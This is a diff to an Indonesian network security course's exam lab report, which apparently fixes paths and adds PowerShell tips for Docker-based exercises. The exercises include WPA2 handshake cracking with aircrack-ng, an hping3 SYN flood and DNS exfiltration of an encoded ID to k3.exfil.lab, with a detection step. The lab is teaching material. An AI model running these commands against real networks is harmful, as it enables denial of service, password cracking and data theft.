@@ -13,7 +13,7 @@
 | Kata sandi | kunci-k3-2026 |
 | Domain | k3.exfil.lab |
 
-Semua perintah dijalankan di PowerShell (Windows), di dalam folder repositori `uts-network-lab`.
+Semua perintah dijalankan di PowerShell 5.1 (Windows), dari folder `UTS-Network-Security` pada repositori `Network-Security-Course-Bank`. Catatan: pada repo ini, materi lab (`b/`, `kasus/`, `samples/`) berada di dalam subfolder `01-sumber-lab/`, sehingga semua path pada perintah di bawah sudah disesuaikan (ditambah prefix `01-sumber-lab/`) dari command mentah di lembar perintah UTS.
 
 ---
 
@@ -25,9 +25,9 @@ docker volume create vol-k3
 docker run --name w-k3 -v vol-k3:/data alpine sh -c 'echo 24552011148 > /data/laporan-k3.txt'
 docker rm w-k3
 docker run --rm -v vol-k3:/data alpine cat /data/laporan-k3.txt
-docker compose -p k3 -f b/b1-compose/docker-compose.yml up -d
-docker compose -p k3 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
-docker compose -p k3 -f b/b1-compose/docker-compose.yml down -v
+docker compose -p k3 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d
+docker compose -p k3 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
+docker compose -p k3 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
 ```
 
 ### Bukti
@@ -86,8 +86,15 @@ Sebelum spoofing, tabel ARP korban memetakan IP gateway ke MAC address gateway y
 ## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2
 
 ### Perintah
+File `handshake-k3.cap` dan `wordlist-k3.txt` berada di `01-sumber-lab\samples\`. Jalankan dari folder tersebut:
 ```powershell
+cd "01-sumber-lab\samples"
 docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w wordlist-k3.txt handshake-k3.cap
+```
+Catatan: jika muncul error `This file is not a regular 802.11 (wireless) capture` atau `Read 0 packets`, file `.cap` kemungkinan korup akibat konversi line-ending (CRLF) saat `git clone` di Windows. Perbaiki dengan mengunduh ulang file langsung (bypass git) dan menonaktifkan auto-konversi untuk clone berikutnya:
+```powershell
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank/main/UTS-Network-Security/01-sumber-lab/samples/handshake-k3.cap" -OutFile "handshake-k3.cap"
+git config core.autocrlf false
 ```
 
 ### Bukti
@@ -109,8 +116,9 @@ Karena seluruh proses ini melibatkan MIC yang bergantung pada PSK, menangkap han
 ## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
 
 ### Perintah
+Jalankan dari folder `UTS-Network-Security` (bukan dari dalam folder `kasus`), ganti `<ip-korban>` dengan IP korban-k3 hasil `docker inspect` di Tugas 3:
 ```powershell
-docker run --rm --network lab-arp-k3 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
+docker run --rm --network lab-arp-k3 -v "${PWD}/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
 ```
 
 ### Bukti
@@ -127,12 +135,12 @@ Nilai TTL (Time To Live) pada paket balasan ICMP menunjukkan berapa banyak hop/r
 
 ### Perintah
 ```powershell
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml up -d
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
-docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml down -v
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
+docker compose -p k3 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
 ```
 
 ### Bukti
@@ -148,15 +156,20 @@ Pada kondisi normal, koneksi TCP dibentuk melalui *three-way handshake*: klien m
 ## Tugas 7 (Pertemuan 7): DNS Exfiltration
 
 ### Perintah
+Jalankan dari folder `UTS-Network-Security`:
 ```powershell
-docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml up -d
+docker compose -p k3 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
 docker run --rm uts-kali-tools sh -c "echo -n 24552011148 | xxd -p"
-docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k3.exfil.lab @dns
-docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k3.log
-docker run --rm -v "${PWD}:/work" uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k3.log
-docker run --rm uts-kali-tools sh -c "echo <hex> | xxd -r -p"
-docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml down -v
 ```
+Catat hasil hex-nya (untuk NIM 24552011148 hasilnya `3234353532303131313438`), lalu ganti setiap `<hex>` di bawah dengan nilai itu:
+```powershell
+docker compose -p k3 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k3.exfil.lab @dns
+docker compose -p k3 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns | Out-File -Encoding utf8 dns-k3.log
+docker run --rm -v "${PWD}:/work" uts-kali-tools python3 /work/01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py /work/dns-k3.log
+docker run --rm uts-kali-tools sh -c "echo <hex> | xxd -r -p"
+docker compose -p k3 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
+```
+Catatan: gunakan `Out-File -Encoding utf8` (bukan `>` biasa) saat menyimpan log ke file — PowerShell 5.1 menulis redirect `>` dengan encoding UTF-16 secara default, yang bisa membuat `analisis_dns.py` gagal mem-parsing isi log (hasilnya tampak kosong padahal log sebenarnya ada isinya).
 
 ### Bukti
 ![Label hex NIM terdeteksi di log DNS](screenshots/t7-log-detect.png)
